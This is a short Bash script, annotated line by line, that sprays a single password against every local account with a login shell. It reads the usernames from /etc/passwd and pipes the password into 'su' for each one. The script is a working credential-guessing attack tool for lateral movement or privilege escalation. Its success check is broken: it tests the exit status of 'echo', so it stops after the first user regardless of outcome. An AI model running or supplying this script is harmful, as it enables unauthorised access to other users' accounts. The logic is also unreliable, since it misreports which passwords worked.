#!/bin/bash
# The above line specifies that this script should be interpreted by the Bash shell.

do_spray () {
    # This is the start of a function named 'do_spray'. It takes no arguments.
    
    users=$(awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd)
    # This line uses 'awk' to extract usernames from /etc/passwd file based on the condition that the last field ends with 'sh'.
    # It then assigns the list of usernames to the variable 'users'.
    
    for user in $users; do
        # This is a loop that iterates through each user in the 'users' variable.
        
        echo "$1" | timeout 2 su $user -c whoami 2>/dev/null
        # This line pipes the first argument of the script ('$1') to the 'su' command, trying to switch to the current user.
        # It then runs the 'whoami' command in the context of that user.
        # The 'timeout 2' command limits the execution time to 2 seconds.
        # The '2>/dev/null' part redirects any error messages to /dev/null (i.e., discards them).
        
        echo "$user $?"
        # This line prints the username followed by the exit status of the previous command.
        
        if [[ $? -eq 0 ]]; then
            return
            # This checks if the exit status of the previous command is 0 (which means it was successful).
            # If so, it immediately returns from the function.
        fi
        
    done
}

do_spray $1
# This calls the 'do_spray' function with the first argument provided to the script when it's executed.
